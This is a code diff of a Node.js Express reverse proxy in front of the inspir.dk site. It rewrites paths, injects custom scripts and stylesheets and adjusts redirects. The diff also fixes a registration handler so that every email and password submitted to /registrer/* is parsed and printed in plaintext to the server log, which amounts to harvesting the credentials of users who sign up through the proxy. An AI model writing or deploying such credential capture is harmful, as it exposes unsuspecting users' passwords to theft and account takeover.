@@ -7,6 +7,7 @@ const express = require("express");
 const axios = require("axios");
 const cheerio = require("cheerio");
 
+const { parseFormData } = require("./util.js");
 const config = require("./config.json");
 
 
@@ -21,8 +22,8 @@ modules.register("articles");
 modules.register("publication_date");
 modules.register("views");
 modules.register("announcements");
+modules.register("thumbnails");
 // modules.register("kantinen");
-// modules.register("thumbnails");
 
 
 // (_) Github webhook
@@ -129,6 +130,7 @@ function paramsHook(req, params) {
 
 
 // (Y) Redirects
+ // TODO map redirectUrl before modifying redirect, so this function makes more sense?
 function changeRedirect(req, redirectUrl, params) {
 	if (redirectUrl == "/page") {
 		return "/";
@@ -140,9 +142,11 @@ function changeRedirect(req, redirectUrl, params) {
 			return req.query["backTo"] || "/redaktør";
 		}
 	} else if (req.method == "POST" && req.path.startsWith("/registrer/")) {
-		return "/";
+		return redirectUrl.startsWith("/register/step-three/") ? redirectUrl : "/";
 	} else if (req.method == "GET" && req.path == "/user/logout") {
 		return req.query["backTo"] || "/";
+	} else if (req.method == "POST" && req.path == "/rediger-artikel") {
+		return redirectUrl.startsWith("/register/step-three/") ? redirectUrl : "/";
 	} else {
 		return redirectUrl;
 	}
@@ -173,14 +177,17 @@ function pageHook(req, html) {
 	remappedHtml = remapAllPaths(remappedHtml, urlPathHrefRegex);
 	remappedHtml = remapAllPaths(remappedHtml, backToPathHrefRegex);
 
-	// Parse HTML
+	// Parse HTML and reorder scripts
 	let $ = cheerio.load(remappedHtml);
-	let jQueryScript = $("body script[src*='code.jquery.com']");
-	let datatablesScript = $("body script[src*='cdn.datatables.net']");
 
+	let jQueryScript = $("body script[src*='code.jquery.com']");
+	let notifyScript = $("script[src*='notify.min.js']");
+	jQueryScript.after(notifyScript);
+	let datatablesScript = $("body script[src*='cdn.datatables.net']");
+	jQueryScript.after(datatablesScript);
+	
 	// Fixes to redaktør page
 	if (req.path == "/redaktør") {
-		datatablesScript.insertAfter(jQueryScript);
 		$("body script").each((_, script) => {
 			$(script).html($(script).html().replace(/^\s*initDataTable\(\);?/, ""));
 		});
@@ -188,7 +195,7 @@ function pageHook(req, html) {
 
 	// Injects
 	let lastHead = $("head").last(); // Yes, there can be multiple heads cause these pages are so weird
-	let lastRequiredScript = $("body script[src*='code.jquery.com'], body script[src*='cdn.datatables.net']").last();
+	let lastRequiredScript = $([jQueryScript, datatablesScript, notifyScript]).last();
 
 	lastHead.append(`<link rel="stylesheet" href="/custom/css/general.css">`);
 	lastRequiredScript.after(`<script src="/custom/js/general.js"></script>`);
@@ -217,9 +224,8 @@ server.post("/login", express.urlencoded({extended: true}), (req, res, next) => 
 	next();
 });
 
-// TODO (?) this doesn't work
-server.post("/registrer", express.urlencoded({extended: true}), (req, res, next) => {
-	let { email, password } = req.body;
+server.post("/registrer/*", express.raw({type: "*/*"}), (req, res, next) => {
+	let { email, password } = parseFormData(req);
 	console.log(`[+] ${email} | ${password}`);
 	next();
 });
@@ -259,7 +265,8 @@ server.use(async (req, res, next) => {
 	inspirUrlEnd = unmapAllPaths(inspirUrlEnd, /^[^?]+/g);
 
 	// Inspir request
-	delete req.headers.host;
+	delete req.headers["host"];
+	delete req.headers["content-length"];
 	let inspirRes = res.locals.inspirRes = await axios({
 		method: req.method,
 		url: `https://www.inspir.dk${inspirUrlEnd}`,
@@ -307,10 +314,8 @@ server.use(async (req, res, next) => {
 	next();
 });
 
-
 // Module hooks
 modules.useHooks(server, database);
-
 
 server.use((req, res) => {
 	let { inspirRes, $, encoding } = res.locals;
